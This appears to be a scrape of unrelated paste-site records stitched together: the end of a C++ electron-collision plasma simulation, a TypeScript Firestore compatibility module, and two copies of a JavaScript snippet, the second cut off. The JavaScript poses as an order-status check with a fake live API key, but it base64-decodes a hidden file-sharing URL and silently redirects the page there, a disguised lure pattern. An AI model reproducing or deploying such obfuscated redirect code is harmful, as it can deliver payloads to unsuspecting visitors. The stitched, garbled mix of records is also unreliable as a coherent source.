                    double dv_x = C*( (1.0-beta*cos_khi)*e1 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(-e2) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e1*e3)  );
                    double dv_y = C*( (1.0-beta*cos_khi)*e2 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(e1) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(-e2*e3)  );
                    double dv_z = C*( (1.0-beta*cos_khi)*e3 + (beta*sin_khi*sin(phi)/sqrt(e1*e1+e2*e2))*(0.0) + (beta*sin_khi*cos(phi)/sqrt(e1*e1+e2*e2))*(e1*e1 + e2*e2)  );
    
                    //updating electron energy and velocities         
                    
                    e.vx += dv_x;
                    e.vy += dv_y;
                    e.vz += dv_z;

                    e.energy = (e.vx*e.vx + e.vy*e.vy + e.vz*e.vz) * charge_mass_ratio;
                    //counting collisions, working with flags, popping atom out of the vector

                    // if (!exc_2.empty()) {
                    //     std::swap(exc_2[index], exc_2.back());
                    //     exc_2.pop_back();
                    //     N_He++;
                    // }

                    collision_counter_en++;   
                    super2_coll_counter++;
                    super2_coll_counter_temp++;
                    energy_sup += thresh2;

                    e.collided_en = true;
                }
            }              

            else {
                // null-collision
                collision_counter_en++;
                null_coll_counter++;
                electrons[i].collided_en = true;
            }
            
        
            /// -- electrin field heating along E-Z axis begin--- /// -- second half!!!


            energy_Efield += ( C1*electrons[i].vz*half_dt + C2*half_dt*half_dt )/q; //dividing by q to get eV
            // Update velocity component due to electric field
            // double a_z = ((-1.0)*q * E_reduced) / m_e; // acceleration in z-direction, m/s^2
            electrons[i].vz += a_z * (dt*0.5); // only half timestep

            // Recalculate energy from updated velocity
            vx = electrons[i].vx;
            vy = electrons[i].vy;
            vz = electrons[i].vz;
            electrons[i].energy = (vx*vx + vy*vy + vz*vz) * charge_mass_ratio;

            // -------------------------------------------- filed heating ends ------------------------////////////////
        }

        int decay_counter = 0;

        // // Iterate backwards to safely remove elements
        // for (int i = exc_2.size() - 1; i >= 0; --i) {
        //     if (dis(gen) < dt / tau_singlet) {
        //         // Swap with last element and pop (like your superelastic code)
        //         std::swap(exc_2[i], exc_2.back());
        //         exc_2.pop_back();
        //         N_He++;
        //         decay_counter++;
        //     }
        // }


        t_elapsed += dt; // Advance time
 
        // // Recalculate nu_max periodically (e.g., every 100 steps)
        // static int recalc_counter = 0;
        // if (++recalc_counter >= 1000) {
            
        //     recalc_counter = 0;
 
        //     // Recalculate nu_max with CURRENT densities
        //     nu_max = 0.0;
        //     for (int i = 0; i < N; i++) {
        //         double energy = Emin + (i + 0.5) * bin_width;
                
        //         // Get current densities
        //         double n_ground = N_He / Volume;
        //         double n_excited1 = exc_1.size() / Volume;
        //         double n_excited2 = exc_2.size() / Volume;
                
        //         // Total collision frequency for this energy bin
        //         double sigma_total = 
        //             elastic_vec[i] * n_ground +
        //             inelastic1_vec[i] * n_ground +
        //             inelastic2_vec[i] * n_ground +
        //             superelastic1_vec[i] * n_excited1 +
        //             superelastic2_vec[i] * n_excited2;
 
        //         double speed = sqrt_charge_mass*sqrt(energy);
        //         double nu_temp = sigma_total * speed;
                
        //         if (nu_temp > nu_max) nu_max = nu_temp;
        //     }

        //     // Update dt based on new nu_max
        //     dt = 0.1 / nu_max;        
        // }   

        // calculating mean energy 
        if (static_cast<int>(t_elapsed/dt)%print_interval == 0) {
            double total_energy = 0.0;
            for (const auto& e : electrons) total_energy += e.energy;
            double mean_energy = total_energy / n_e;
            file8 << t_elapsed << "" "" << mean_energy << ""\n"";            
            file_temp << t_elapsed << "" "" << exc_1.size() << "" "" << exc_2.size() << ""\n"";
            std::cout << ""Progress: "" << (t_elapsed/total_time)*100 << ""%"" << "" "";
            std::cout << ""   nu_max: "" << nu_max << ""    "" << ""dt: "" << dt << "" "" << ""decay counter: "" << decay_counter <<   ""\n"";
            file16 << t_elapsed << "" "" << energy_Efield/n_e << "" "" << energy_sup/n_e << ""\n"";
        }        

    }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = static_cast<int>( (electrons[i].energy - Emin)/bin_width_smooth);
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < N_smooth; i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width_smooth;
        file4 << bin_center << "" "" <<  (static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width_smooth))/sqrt(bin_center) << ""\n""; // getting EEPF eV-3/2
    }

        std::cout << ""Total # of electrons in a final histogram: "" << check << ""\n"";
        std::cout << ""Final nu max: "" << nu_max << ""\n"";

    // ----- final electron energies distribution ends


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();
    file10.close();
    file11.close();
    file12.close();
    file13.close();
    file14.close();
    file15.close();
    file_temp.close();
    file16.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    // std::cout << ""# of steps: "" << steps << ""\n"";
    // std::cout << ""# of electrons collided each timesteps:"" << Ne_collided << ""\n"";
    
    // std::cout << ""Average elastic collisions per timestep: "" << static_cast<int>(el_coll_counter/steps) << ""\n"";
    // std::cout << ""Average null collisions per timestep: "" << static_cast<int>(null_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""triplet:________"" << ""\n"";
    // std::cout << ""Average triplet excitation collisions per timestep: "" << static_cast<int>(exc1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic triplet collisions per timestep: "" << static_cast<int>(super1_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";

    // std::cout << ""singlet:________"" << ""\n"";
    // std::cout << ""Average singlet excitation collisions per timestep: "" << static_cast<int>(exc2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";
    // std::cout << ""Average superelastic singlet collisions per timestep: "" << static_cast<int>(super2_coll_counter/steps) << ""\n"";
    // std::cout << ""\n"";    

    // std::cout << ""Average e-e collisions per timestep: "" << static_cast<int>(ee_coll_counter/steps) << ""\n"";

    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
YHW4MAdY,Untitled,WantingTrae,JavaScript,Monday 21st of April 2025 10:34:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21995/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
D2Deq2wN,firestoreCompat.ts,Froredion,TypeScript,Monday 21st of April 2025 10:29:37 AM CDT,"/**
 * Firestore Compatibility Utility
 * 
 * This module provides a universal interface for working with Firestore across different platforms
 * (web and React Native). It abstracts away the differences between the Firebase Web SDK and
 * React Native Firebase SDK, providing consistent function signatures and behavior.
 * 
 * Usage:
 * - Import firestoreDbInstance as firestoreDb
 * - Import firestoreFunctionsCompat as firestoreFunctions
 * 
 * This allows for platform-agnostic Firestore operations throughout the application.
 */

import { Platform } from 'react-native';
import { db } from '../../config';
import { useWebSDK, logPlatformDetection } from '@/lib/utils/platform';
import structuredClone from '@ungap/structured-clone';

// Environment detection
const isWebSDKFlag = useWebSDK();

logPlatformDetection('FirestoreCompat');

// Define constraint types for React Native Firebase
interface QueryConstraint {
  type: 'where' | 'orderBy' | 'limit' | 'startAfter' | 'startAt' | 'endBefore' | 'endAt';
  args: any[];
}

// Define the Firestore functions interface
export interface FirestoreFunctions {
  doc: (db: any, path: string, ...segments: string[]) => any;
  setDoc: (ref: any, data: any, options?: any) => Promise<any>;
  getDoc: (ref: any) => Promise<any>;
  collection: (db: any, path: string, ...segments: string[]) => any;
  addDoc: (ref: any, data: any) => Promise<any>;
  serverTimestamp: () => any;
  query: (ref: any, ...queryConstraints: any[]) => any;
  where: (field: string, opStr: string, value: any) => any;
  orderBy: (field: string, direction?: 'asc' | 'desc') => any;
  limit: (limit: number) => any;
  startAfter: (value: any) => any;
  startAt: (value: any) => any;
  endBefore: (value: any) => any;
  endAt: (value: any) => any;
  getDocs: (queryRef: any) => Promise<any>;
  onSnapshot: (ref: any, onNext: (snapshot: any) => void, onError?: (error: Error) => void) => () => void;
  updateDoc: (ref: any, data: any) => Promise<any>;
  arrayUnion: (...values: any[]) => any;
  arrayRemove: (...values: any[]) => any;
  deleteDoc: (ref: any) => Promise<any>;
  // Batch operations
  writeBatch: (db: any) => any;
  batchSetDoc: (batch: any, ref: any, data: any, options?: any) => void;
  batchUpdateDoc: (batch: any, ref: any, data: any) => void;
  batchDeleteDoc: (batch: any, ref: any) => void;
  batchCommit: (batch: any) => Promise<void>;
}

// Initialize Firestore instance and functions based on platform
let firestoreDbInstance: any;
let firestoreFunctionsCompat: FirestoreFunctions;

// Add at the top for consistent logging
const logSnapshot = (...args: any[]) => {
  if (process.env.NODE_ENV !== 'production') {
    // console.log('[FirestoreCompat][Snapshot]', ...args);
  }
};

/**
 * Creates a Web SDK compatible DocumentSnapshot wrapper
 * Ensures all methods and properties match the Firebase JS SDK behavior
 */
const createWebSDKCompatibleSnapshot = (snapshot: any, docRef: any): any => {
  logSnapshot('createWebSDKCompatibleSnapshot: called', { hasSnapshot: !!snapshot, docRef });
  // Handle null or undefined snapshots
  if (!snapshot) {
    // If this error happens:
    // 1. [firestore/permission-denied] likely means firestore.rules permission is not set correctly
    logSnapshot('createWebSDKCompatibleSnapshot: Received null or undefined document snapshot', { docRef });
    console.error('Error: Received null or undefined document snapshot');
    
    // Return a valid but empty document snapshot that clearly indicates an error occurred
    const emptySnapshot = {
      exists: () => false,
      data: () => null,
      id: docRef?.id || 'unknown-doc-id',
      ref: docRef,
      get: () => undefined,
      // Flags to identify this as a wrapped error snapshot
      _wrapped: true,
      _type: 'document',
      _isError: true,
      _errorType: 'null_snapshot'
    };
    logSnapshot('createWebSDKCompatibleSnapshot: returning empty snapshot', emptySnapshot);
    return emptySnapshot;
  }
  // Handle case when we receive an already wrapped snapshot
  if (snapshot._wrapped && snapshot._type === 'document') {
    logSnapshot('createWebSDKCompatibleSnapshot: already wrapped snapshot', snapshot);
    return snapshot;
  }
  // Determine if the document exists
  let existsValue = false;
  if (typeof snapshot.exists === 'function') {
    existsValue = snapshot.exists();
  } else if (typeof snapshot.exists === 'boolean') {
    existsValue = snapshot.exists;
  } else {
    try {
      const data = typeof snapshot.data === 'function' ? snapshot.data() : null;
      existsValue = !!data;
    } catch (error) {
      existsValue = false;
      logSnapshot('createWebSDKCompatibleSnapshot: error checking existence', error);
    }
  }
  // Build the snapshot data once to avoid repeated calls
  let snapshotData = null;
  try {
    snapshotData = typeof snapshot.data === 'function' ? snapshot.data() : null;
  } catch (error) {
    snapshotData = null;
    logSnapshot('createWebSDKCompatibleSnapshot: error getting data', error);
  }
  const wrappedSnapshot = {
    data: function() {
      logSnapshot('wrappedSnapshot.data() called', { snapshotData });
      return snapshotData;
    },
    exists: function() {
      logSnapshot('wrappedSnapshot.exists() called', { existsValue });
      return existsValue;
    },
    id: snapshot.id || docRef?.id || '',
    ref: docRef,
    get: function(fieldPath: string) {
      logSnapshot('wrappedSnapshot.get() called', { fieldPath });
      if (!snapshotData) return undefined;
      if (fieldPath.includes('.')) {
        const parts = fieldPath.split('.');
        let value = snapshotData;
        for (const part of parts) {
          if (value === undefined || value === null) return undefined;
          value = value[part];
        }
        logSnapshot('wrappedSnapshot.get() dot notation result', { fieldPath, value });
        return value;
      }
      logSnapshot('wrappedSnapshot.get() direct result', { fieldPath, value: snapshotData[fieldPath] });
      return snapshotData[fieldPath];
    },
    _wrapped: true,
    _type: 'document',
    _originalSnapshot: snapshot
  };
  logSnapshot('createWebSDKCompatibleSnapshot: returning wrappedSnapshot', wrappedSnapshot);
  return wrappedSnapshot;
};

/**
 * Creates a Web SDK compatible QuerySnapshot wrapper
 * Ensures all methods and properties match the Firebase JS SDK behavior
 */
const createWebSDKCompatibleQuerySnapshot = (snapshot: any): any => {
  logSnapshot('createWebSDKCompatibleQuerySnapshot: called', { hasSnapshot: !!snapshot, docsCount: Array.isArray(snapshot?.docs) ? snapshot.docs.length : 0 });
  if (!snapshot) {
    logSnapshot('createWebSDKCompatibleQuerySnapshot: Received null or undefined query snapshot');
    return {
      docs: [],
      empty: true,
      size: 0,
      forEach: (callback: any) => {},
      docChanges: () => [],
      _wrapped: true,
      _type: 'query',
      _isError: true,
      _errorType: 'null_snapshot'
    };
  }
  if (snapshot._wrapped && snapshot._type === 'query') {
    logSnapshot('createWebSDKCompatibleQuerySnapshot: already wrapped snapshot', { docsCount: Array.isArray(snapshot?.docs) ? snapshot.docs.length : 0 });
    return snapshot;
  }
  const docsArray = Array.isArray(snapshot.docs) 
    ? snapshot.docs.map((doc: any) => {
        if (doc._wrapped && doc._type === 'document') {
          return doc;
        }
        return createWebSDKCompatibleSnapshot(doc, doc.ref);
      })
    : [];
  const wrappedSnapshot = {
    docs: docsArray,
    empty: docsArray.length === 0,
    size: docsArray.length,
    forEach: function(callback: (doc: any) => void) {
      logSnapshot('wrappedQuerySnapshot.forEach() called', { docsCount: docsArray.length });
      docsArray.forEach((doc: any) => callback(doc));
    },
    docChanges: function() {
      logSnapshot('wrappedQuerySnapshot.docChanges() called', { docsCount: docsArray.length });
      if (typeof snapshot.docChanges === 'function') {
        return snapshot.docChanges().map((change: any) => ({
          ...change,
          doc: change.doc._wrapped 
            ? change.doc 
            : createWebSDKCompatibleSnapshot(change.doc, change.doc.ref)
        }));
      }
      return docsArray.map((doc: any, index: number) => ({
        type: 'added',
        doc,
        oldIndex: -1,
        newIndex: index
      }));
    },
    _wrapped: true,
    _type: 'query',
    _originalSnapshot: snapshot
  };
  logSnapshot('createWebSDKCompatibleQuerySnapshot: returning wrappedSnapshot', { docsCount: docsArray.length });
  return wrappedSnapshot;
};

/**
 * Creates a special wrapper for document snapshots that need to behave like query snapshots
 * This bridges the gap for code that expects a QuerySnapshot but receives a DocumentSnapshot
 */
const createDocumentAsQuerySnapshot = (docSnapshot: any): any => {
  logSnapshot('createDocumentAsQuerySnapshot: called', { hasDocSnapshot: !!docSnapshot });
  if (!docSnapshot) {
    logSnapshot('createDocumentAsQuerySnapshot: null input');
    return createWebSDKCompatibleQuerySnapshot(null);
  }
  if (docSnapshot._wrapped && docSnapshot._type === 'query') {
    logSnapshot('createDocumentAsQuerySnapshot: already wrapped query snapshot', docSnapshot);
    return docSnapshot;
  }
  const wrappedDoc = docSnapshot._wrapped && docSnapshot._type === 'document'
    ? docSnapshot
    : createWebSDKCompatibleSnapshot(docSnapshot, docSnapshot.ref);
  const querySnapshot = {
    docs: wrappedDoc.exists() ? [wrappedDoc] : [],
    empty: !wrappedDoc.exists(),
    size: wrappedDoc.exists() ? 1 : 0,
    forEach: function(callback: (doc: any) => void) {
      logSnapshot('syntheticQuerySnapshot.forEach() called', { exists: wrappedDoc.exists() });
      if (wrappedDoc.exists()) {
        callback(wrappedDoc);
      }
    },
    docChanges: function() {
      logSnapshot('syntheticQuerySnapshot.docChanges() called', { exists: wrappedDoc.exists() });
      if (!wrappedDoc.exists()) return [];
      return [{
        type: 'added',
        doc: wrappedDoc,
        oldIndex: -1,
        newIndex: 0
      }];
    },
    _wrapped: true,
    _type: 'query',
    _isSynthetic: true,
    _wrappedDoc: wrappedDoc
  };
  logSnapshot('createDocumentAsQuerySnapshot: returning synthetic querySnapshot', querySnapshot);
  return querySnapshot;
};

/**
 * Enhanced wrapper function for onSnapshot that properly handles all reference types
 * and ensures consistent behavior between Web SDK and React Native Firebase
 * 
 * @param ref The Firestore reference (document, collection, or query)
 * @param onNext Callback function to be called when the snapshot changes
 * @param onError Optional callback function to be called when an error occurs
 * @returns A function to unsubscribe from the snapshot listener
 */
const wrappedOnSnapshot = (ref: any, onNext: (snapshot: any) => void, onError?: (error: Error) => void): (() => void) => {
  logSnapshot('wrappedOnSnapshot: called', { hasRef: !!ref });
  if (!ref) {
    logSnapshot('wrappedOnSnapshot: Received null or undefined reference');
    console.error('wrappedOnSnapshot: Received null or undefined reference');
    return () => {};
  }

  // Use detectFirestoreRefType for reference type detection
  const refType = detectFirestoreRefType(ref);

  // Determine path for special case handling
  let refPath = '';
  try {
    refPath = ref.path || '';
  } catch (e) {
    // Path might not be accessible for all reference types
  }

  // Get the appropriate platform-specific onSnapshot implementation
  const platformOnSnapshot = (ref: any, onNext: any, onError?: any) => ref.onSnapshot(onNext, onError);

  // Return the unsubscribe function
  return platformOnSnapshot(ref, (snapshot: any) => {
    logSnapshot('wrappedOnSnapshot: snapshot received', { docsCount: Array.isArray(snapshot?.docs) ? snapshot.docs.length : undefined });
    try {
      if (refType === 'document') {
        logSnapshot('wrappedOnSnapshot: Detected Document Reference');
        const wrappedSnapshot = createWebSDKCompatibleSnapshot(snapshot, ref);
        logSnapshot('wrappedOnSnapshot: calling onNext with wrappedSnapshot', wrappedSnapshot);
        onNext(wrappedSnapshot);
      }
      else if (refType === 'collection' || refType === 'query') {
        logSnapshot('wrappedOnSnapshot: Detected Collection/Query Reference');
        const wrappedSnapshot = createWebSDKCompatibleQuerySnapshot(snapshot);
        onNext(wrappedSnapshot);
      }
      else {
        logSnapshot('wrappedOnSnapshot: Unknown Reference Type');
        if (snapshot && typeof snapshot.docs !== 'undefined') {
          logSnapshot('wrappedOnSnapshot: Fallback as QuerySnapshot', { docsCount: Array.isArray(snapshot?.docs) ? snapshot.docs.length : 0 });
          const wrappedSnapshot = createWebSDKCompatibleQuerySnapshot(snapshot);
          onNext(wrappedSnapshot);
        }
        else if (snapshot && (typeof snapshot.exists === 'function' || typeof snapshot.exists === 'boolean')) {
          logSnapshot('wrappedOnSnapshot: Fallback as DocumentSnapshot');
          const wrappedSnapshot = createWebSDKCompatibleSnapshot(snapshot, ref);
          const callStack = new Error().stack || '';
          if (callStack.includes('forEach')) {
            logSnapshot('wrappedOnSnapshot: callStack includes forEach, using createDocumentAsQuerySnapshot');
            onNext(createDocumentAsQuerySnapshot(wrappedSnapshot));
          } else {
            onNext(wrappedSnapshot);
          }
        }
        else {
          logSnapshot('wrappedOnSnapshot: Last resort, passing through raw snapshot');
          console.warn('wrappedOnSnapshot: Unknown snapshot type, passing through raw snapshot');
          onNext(snapshot);
        }
      }
    } catch (error) {
      console.error('Error in wrappedOnSnapshot:', error);
    }
  }, onError);
};

/**
 * Detects the type of Firestore reference: document, collection, query, or unknown.
 * Compatible with both Web SDK and React Native Firebase.
 */
export function detectFirestoreRefType(ref: any): 'document' | 'collection' | 'query' | 'unknown' {
  // Web SDK: DocumentReference has .id and .parent, but no .where()
  if (ref?.id && ref?.parent && typeof ref?.where !== 'function') {
    return 'document';
  }

  // Web SDK: Query has .where() and .get() but no .id or .parent
  if (typeof ref?.where === 'function' && typeof ref?.get === 'function') {
    return 'query';
  }

  // RNFB (React Native Firebase): detect collection/document based on _parts
  if (Array.isArray(ref?._parts)) {
    const partsLength = ref._parts.length;
    if (partsLength % 2 === 0) {
      return 'document'; // Even number of parts = document (e.g., /col/doc)
    } else {
      return 'collection'; // Odd number of parts = collection (e.g., /col)
    }
  }

  return 'unknown';
}

if (isWebSDKFlag) {
  // Web SDK imports
  const {
    doc,
    setDoc,
    getDoc,
    collection,
    addDoc,
    serverTimestamp,
    query,
    where,
    orderBy,
    limit,
    startAfter,
    startAt,
    endBefore,
    endAt,
    getDocs,
    onSnapshot,
    updateDoc,
    arrayUnion,
    arrayRemove,
    deleteDoc,
    writeBatch,
    batchSetDoc,
    batchUpdateDoc,
    batchDeleteDoc,
    batchCommit
  } = require('firebase/firestore');
  
  firestoreDbInstance = db;
  
  // Store web Firestore functions for later use
  firestoreFunctionsCompat = {
    doc,
    setDoc,
    getDoc,
    collection,
    addDoc,
    serverTimestamp,
    query,
    where,
    orderBy,
    limit,
    startAfter,
    startAt,
    endBefore,
    endAt,
    getDocs,
    onSnapshot,
    updateDoc,
    arrayUnion,
    arrayRemove,
    deleteDoc,
    writeBatch,
    batchSetDoc,
    batchUpdateDoc,
    batchDeleteDoc,
    batchCommit
  };
} else {
  // React Native Firebase SDK imports
  const firestoreRNFB = require('@react-native-firebase/firestore').default;
  firestoreDbInstance = db;

  const { 
    serverTimestamp,
  } = require('@react-native-firebase/firestore');

  // Helper function to create a constraint object
  const createConstraint = (type: 'where' | 'orderBy' | 'limit' | 'startAfter' | 'startAt' | 'endBefore' | 'endAt', args: any[]): QueryConstraint => {
    return { type, args };
  };
  
  // Universal collection function for React Native Firebase
  const universalCollection = (db: any, path: string, ...segments: string[]): any => {
    // For React Native Firebase, we ignore the db parameter and use the firestore instance
    let ref = firestoreDbInstance;
    
    // If no segments are provided, just return the collection reference
    if (segments.length === 0) {
      return ref.collection(path);
    }
    
    // Handle deep nesting paths similar to doc()
    let allSegments = [path, ...segments];
    
    // Process segments in collection/document pairs
    // For collection, we always need to end with a collection reference
    for (let i = 0; i < allSegments.length; i++) {
      if (i === 0 || i % 2 === 0) {
        // Even indices (0, 2, 4...) are collections
        ref = ref.collection(allSegments[i]);
      } else {
        // Odd indices (1, 3, 5...) are documents
        ref = ref.doc(allSegments[i]);
      }
    }
    
    return ref;
  };

  // Universal document reference function for React Native Firebase
  const doc = (db: any, path: string, ...segments: string[]): any => {
    // For React Native Firebase, we ignore the db parameter and use the firestore instance
    let ref = firestoreDbInstance;
    
    // Handle paths like doc(db, 'collection') - should return a document with auto-ID
    if (segments.length === 0) {
      return ref.collection(path).doc();
    }
    
    // Handle paths like doc(db, 'collection', 'docId')
    if (segments.length === 1) {
      return ref.collection(path).doc(segments[0]);
    }
    
    // Handle deep nesting paths like doc(db, 'orgs', 'org1', 'projects', 'proj2')
    let allSegments = [path, ...segments];
    
    // Process segments in collection/document pairs
    for (let i = 0; i < allSegments.length; i += 2) {
      const collectionName = allSegments[i];
      
      // If we have a collection but no document ID after it, return a reference with auto-ID
      if (i + 1 >= allSegments.length) {
        ref = ref.collection(collectionName).doc();
        break;
      }
      
      const documentId = allSegments[i + 1];
      ref = ref.collection(collectionName).doc(documentId);
    }
    
    return ref;
  };
  
  // Implementation of setDoc for React Native Firebase
  const setDoc = async (docRef: any, data: any, options?: { merge?: boolean }): Promise<void> => {
    return docRef.set(data, options);
  };
  
  // Implementation of getDoc for React Native Firebase
  const getDoc = async (docRef: any): Promise<any> => {
    try {
      const snapshot = await docRef.get();
      return createWebSDKCompatibleSnapshot(snapshot, docRef);
    } catch (error) {
      console.error('Error in getDoc:', error);
      // Return a non-existent snapshot
      return createWebSDKCompatibleSnapshot(null, docRef);
    }
  };
  
  // Implementation of addDoc for React Native Firebase
  const addDoc = async (collectionRef: any, data: any): Promise<any> => {
    // React Native Firebase's add method returns a DocumentReference with an auto-generated ID
    const docRef = await collectionRef.add(data);
    
    // Ensure the returned reference has all expected properties
    if (!docRef.id && docRef.path) {
      // Extract the document ID from the path if it's missing
      const pathSegments = docRef.path.split('/');
      docRef.id = pathSegments[pathSegments.length - 1];
    }
    
    return docRef;
  };
  
  // Store RN Firestore functions for later use
  firestoreFunctionsCompat = {
    doc,  
    setDoc,
    getDoc,
    collection: universalCollection,
    addDoc,
    serverTimestamp,
    // For React Native Firebase, we need to handle the query constraints differently
    query: (ref: any, ...queryConstraints: any[]) => {
      console.log('[FirestoreCompat][query] Starting query with constraints:', {
        refPath: ref?.path || 'unknown',
        constraintsCount: queryConstraints.length,
        constraints: queryConstraints.map(c => {
          if (typeof c === 'object' && c !== null) {
            return { type: c.type, args: c.args };
          }
          return typeof c;
        })
      });
      
      let queryRef = ref;
    
      for (const constraint of queryConstraints) {
        if (!constraint) {
          console.log('[FirestoreCompat][query] Skipping null/undefined constraint');
          continue;
        }
    
        // New constraint object format (preferred)
        if (typeof constraint === 'object' && 'type' in constraint && Array.isArray(constraint.args)) {
          const { type, args } = constraint;
          console.log(`[FirestoreCompat][query] Processing constraint: ${type}`, { args });
    
          switch (type) {
            case 'where':
              console.log(`[FirestoreCompat][query] Applying where constraint: ${args[0]} ${args[1]} ${JSON.stringify(args[2])}`);
              queryRef = queryRef.where(...args);
              console.log('[FirestoreCompat][query] Updated query reference:', {
                path: queryRef?.path || 'unknown',
                hasWhere: typeof queryRef?.where === 'function',
                hasOrderBy: typeof queryRef?.orderBy === 'function',
                hasLimit: typeof queryRef?.limit === 'function'
              });
              break;
            case 'orderBy':
              console.log(`[FirestoreCompat][query] Applying orderBy constraint: ${args[0]} ${args[1] || 'asc'}`);
              queryRef = queryRef.orderBy(...args);
              break;
            case 'limit':
              console.log(`[FirestoreCompat][query] Applying limit constraint: ${args[0]}`);
              queryRef = queryRef.limit(...args);
              break;
            case 'startAfter':
              console.log(`[FirestoreCompat][query] Applying startAfter constraint: ${JSON.stringify(args[0])}`);
              queryRef = queryRef.startAfter(...args);
              break;
            case 'startAt':
              console.log(`[FirestoreCompat][query] Applying startAt constraint: ${JSON.stringify(args[0])}`);
              queryRef = queryRef.startAt(...args);
              break;
            case 'endBefore':
              console.log(`[FirestoreCompat][query] Applying endBefore constraint: ${JSON.stringify(args[0])}`);
              queryRef = queryRef.endBefore(...args);
              break;
            case 'endAt':
              console.log(`[FirestoreCompat][query] Applying endAt constraint: ${JSON.stringify(args[0])}`);
              queryRef = queryRef.endAt(...args);
              break;
            default:
              console.warn(`[FirestoreCompat][query] Unsupported query constraint type: ${type}`);
          }
        }
      }
    
      console.log('[FirestoreCompat][query] Final query reference:', {
        path: queryRef?.path || 'unknown',
        hasWhere: typeof queryRef?.where === 'function',
        hasOrderBy: typeof queryRef?.orderBy === 'function',
        hasLimit: typeof queryRef?.limit === 'function'
      });
      
      return queryRef;
    },
    // For React Native Firebase, we need to return a constraint object instead of applying it directly
    where: (field: string, opStr: string, value: any) => {
      return createConstraint('where', [field, opStr, value]);
    },
    // Add support for additional query constraints
    orderBy: (field: string, direction: 'asc' | 'desc' = 'asc') => {
      return createConstraint('orderBy', [field, direction]);
    },
    limit: (limit: number) => {
      return createConstraint('limit', [limit]);
    },
    startAfter: (value: any) => {
      return createConstraint('startAfter', [value]);
    },
    startAt: (value: any) => {
      return createConstraint('startAt', [value]);
    },
    endBefore: (value: any) => {
      return createConstraint('endBefore', [value]);
    },
    endAt: (value: any) => {
      return createConstraint('endAt', [value]);
    },
    getDocs: async (queryRef: any) => {
      try {
        console.log('[FirestoreCompat][getDocs] Query reference:', {
          path: queryRef?.path || 'unknown',
          hasWhere: typeof queryRef?.where === 'function',
          hasOrderBy: typeof queryRef?.orderBy === 'function',
          hasLimit: typeof queryRef?.limit === 'function'
        });
        const snapshot = await queryRef.get();
        return createWebSDKCompatibleQuerySnapshot(snapshot);
      } catch (error) {
        // Bug: queryRef.path = unknown
          // Happens when 
        console.log('Error in getDocs:', queryRef);
        console.error('Error in getDocs:', error);
        // Return an empty query snapshot
        return createWebSDKCompatibleQuerySnapshot(null);
      }
    },
    onSnapshot: wrappedOnSnapshot,
    updateDoc: (ref: any, data: any) => ref.update(data),
    arrayUnion: (...values: any[]) => {
      return firestoreRNFB.FieldValue.arrayUnion(...values);
    },
    arrayRemove: (...values: any[]) => {
      return firestoreRNFB.FieldValue.arrayRemove(...values);
    },
    deleteDoc: (ref: any) => ref.delete(),
    // Batch operations for React Native Firebase
    writeBatch: (db: any) => {
      // For React Native Firebase, we ignore the db parameter and use the firestore instance
      return firestoreDbInstance.batch();
    },
    batchSetDoc: (batch, ref, data, options) => {
      batch.set(ref, data, options);
    },
    batchUpdateDoc: (batch, ref, data) => {
      batch.update(ref, data);
    },
    batchDeleteDoc: (batch, ref) => {
      batch.delete(ref);
    },
    batchCommit: (batch) => {
      return batch.commit();
    }
  };
}

// Export the Firestore instance and functions
export { firestoreDbInstance, firestoreFunctionsCompat }; "
uu3JH4EY,Untitled,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 10:18:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79070/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

